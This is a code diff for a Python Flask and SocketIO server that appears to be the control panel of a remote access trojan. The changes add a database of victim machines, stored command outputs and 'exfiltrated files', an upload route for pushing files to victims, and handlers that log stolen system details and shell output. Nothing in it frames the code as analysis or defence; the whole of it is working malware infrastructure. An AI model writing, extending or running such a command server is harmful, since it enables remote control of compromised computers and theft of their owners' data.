@@ -2,30 +2,70 @@
 import os
 import json
 import datetime
-from flask import Flask, render_template, request, send_from_directory
+import sqlite3
+from flask import Flask, render_template, request, send_from_directory, jsonify
 from flask_socketio import SocketIO, emit
 from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'
 app.config['UPLOAD_FOLDER'] = 'uploads'
+app.config['DOWNLOAD_FOLDER'] = 'downloads'
 socketio = SocketIO(app, cors_allowed_origins="*")
 
-# Ensure upload directory exists
-if not os.path.exists(app.config['UPLOAD_FOLDER']):
-    os.makedirs(app.config['UPLOAD_FOLDER'])
+# Ensure directories exist
+for folder in [app.config['UPLOAD_FOLDER'], app.config['DOWNLOAD_FOLDER']]:
+    if not os.path.exists(folder):
+        os.makedirs(folder)
+
+# Initialize SQLite database
+def init_db():
+    conn = sqlite3.connect('rat_data.db')
+    c = conn.cursor()
+    # Create tables
+    c.execute('''CREATE TABLE IF NOT EXISTS clients (
+                 client_id TEXT PRIMARY KEY,
+                 username TEXT,
+                 os TEXT,
+                 hostname TEXT,
+                 last_seen TIMESTAMP
+                 )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS command_outputs (
+                 id INTEGER PRIMARY KEY AUTOINCREMENT,
+                 client_id TEXT,
+                 command TEXT,
+                 output TEXT,
+                 current_dir TEXT,
+                 timestamp TIMESTAMP,
+                 FOREIGN KEY (client_id) REFERENCES clients(client_id)
+                 )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS exfiltrated_files (
+                 id INTEGER PRIMARY KEY AUTOINCREMENT,
+                 client_id TEXT,
+                 filename TEXT,
+                 content TEXT,
+                 timestamp TIMESTAMP,
+                 FOREIGN KEY (client_id) REFERENCES clients(client_id)
+                 )''')
+    conn.commit()
+    conn.close()
+
+init_db()
 
 # Track connected clients
 connected_clients = set()
 
-# Store client info
+# Store client info in memory for quick access
 client_info = {}
 
 def get_files():
-    """List all files in the upload folder."""
-    upload_folder = app.config['UPLOAD_FOLDER']
-    files = [f for f in os.listdir(upload_folder) if os.path.isfile(os.path.join(upload_folder, f))]
-    return sorted(files)
+    """Retrieve exfiltrated files from the database."""
+    conn = sqlite3.connect('rat_data.db')
+    c = conn.cursor()
+    c.execute("SELECT filename FROM exfiltrated_files ORDER BY timestamp DESC")
+    files = [row[0] for row in c.fetchall()]
+    conn.close()
+    return files
 
 @app.route('/')
 def index():
@@ -40,22 +80,42 @@ def send_command():
     command = request.form.get('command')
 
     if not client_id or not command:
-        return {"status": "error", "message": "Missing client_id or command"}, 400
+        return jsonify({"status": "error", "message": "Missing client_id or command"}), 400
 
     # Emit command to the specified client
     socketio.emit('command', command, to=client_id)
 
-    return {"status": "success", "message": f"Command '{command}' sent to {client_id}"}
+    return jsonify({"status": "success", "message": f"Command '{command}' sent to {client_id}"})
+
+@app.route('/upload_file', methods=['POST'])
+def upload_file():
+    """Handle file uploads for downloading to victims."""
+    if 'file' not in request.files:
+        return jsonify({"status": "error", "message": "No file part"}), 400
+    file = request.files['file']
+    if file.filename == '':
+        return jsonify({"status": "error", "message": "No selected file"}), 400
+    if file:
+        filename = secure_filename(file.filename)
+        file_path = os.path.join(app.config['DOWNLOAD_FOLDER'], filename)
+        file.save(file_path)
+        return jsonify({"status": "success", "filename": filename})
+
+@app.route('/download/<filename>')
+def download(filename):
+    """Serve files for clients to download."""
+    return send_from_directory(app.config['DOWNLOAD_FOLDER'], filename)
 
 @app.route('/view_file/<filename>')
 def view_file(filename):
-    """Render a page to view the contents of an uploaded file."""
-    filename = secure_filename(filename)
-    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-    if os.path.exists(file_path):
-        with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
-            content = f.read()
-        return render_template('view_file.html', filename=filename, file_content=content)
+    """Render a page to view the contents of an exfiltrated file."""
+    conn = sqlite3.connect('rat_data.db')
+    c = conn.cursor()
+    c.execute("SELECT content FROM exfiltrated_files WHERE filename = ?", (filename,))
+    row = c.fetchone()
+    conn.close()
+    if row:
+        return render_template('view_file.html', filename=filename, file_content=row[0])
     else:
         return "File not found", 404
 
@@ -83,44 +143,56 @@ def handle_exfil_data(data):
     client_id = request.sid
     data = json.loads(data)
     data_type = data.get('type')
+    conn = sqlite3.connect('rat_data.db')
+    c = conn.cursor()
 
     if data_type == "system_info":
-        # Store client info
-        username = data.get('system', {}).get('username', None)
-        if not username:
-            # Request username via whoami
-            socketio.emit('command', 'whoami', to=client_id)
-        else:
-            client_info[client_id] = data.get('system', {})
-            client_info[client_id]['username'] = username
-        # Save system info to a file
-        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"{client_id}_{timestamp}_sysinfo.json"
-        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-        with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(data, f, indent=4)
-        print(f"[*] Exfiltrated data saved: {filepath}")
+        # Update client info in database
+        system_info = data.get('system', {})
+        username = system_info.get('username', 'unknown')
+        os_info = system_info.get('os', 'unknown')
+        hostname = system_info.get('hostname', 'unknown')
+        timestamp = datetime.datetime.now()
+        c.execute("INSERT OR REPLACE INTO clients (client_id, username, os, hostname, last_seen) VALUES (?, ?, ?, ?, ?)",
+                  (client_id, username, os_info, hostname, timestamp))
+        client_info[client_id] = system_info
+
+        # Save system info as an exfiltrated file
+        filename = f"{client_id}_{timestamp.strftime('%Y%m%d_%H%M%S')}_sysinfo.json"
+        content = json.dumps(data, indent=4)
+        c.execute("INSERT INTO exfiltrated_files (client_id, filename, content, timestamp) VALUES (?, ?, ?, ?)",
+                  (client_id, filename, content, timestamp))
+        print(f"[*] Exfiltrated data stored: {filename}")
 
     elif data_type == "command_output":
         command = data.get('command', 'unknown')
         output = data.get('output', '')
         current_dir = data.get('current_dir', 'unknown')
+        timestamp = datetime.datetime.now()
 
-        # Check if the command was whoami to update username
-        if command.strip().lower() == 'whoami':
+        # Update username if whoami command
+        if command.strip().lower() == "whoami":
             username = output.strip()
+            c.execute("UPDATE clients SET username = ? WHERE client_id = ?", (username, client_id))
             if client_id not in client_info:
                 client_info[client_id] = {}
             client_info[client_id]['username'] = username
 
+        # Store command output
+        c.execute("INSERT INTO command_outputs (client_id, command, output, current_dir, timestamp) VALUES (?, ?, ?, ?, ?)",
+                  (client_id, command, output, current_dir, timestamp))
+
         # Emit command output to web interface
         emit('command_output', {
-            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            'timestamp': timestamp.strftime("%Y-%m-%d %H:%M:%S"),
             'client_id': client_id,
             'command': command,
             'output': output,
             'current_dir': current_dir
         }, broadcast=True)
+
+    conn.commit()
+    conn.close()
 
     # Emit updated client info to web interface
     client_info_list = [
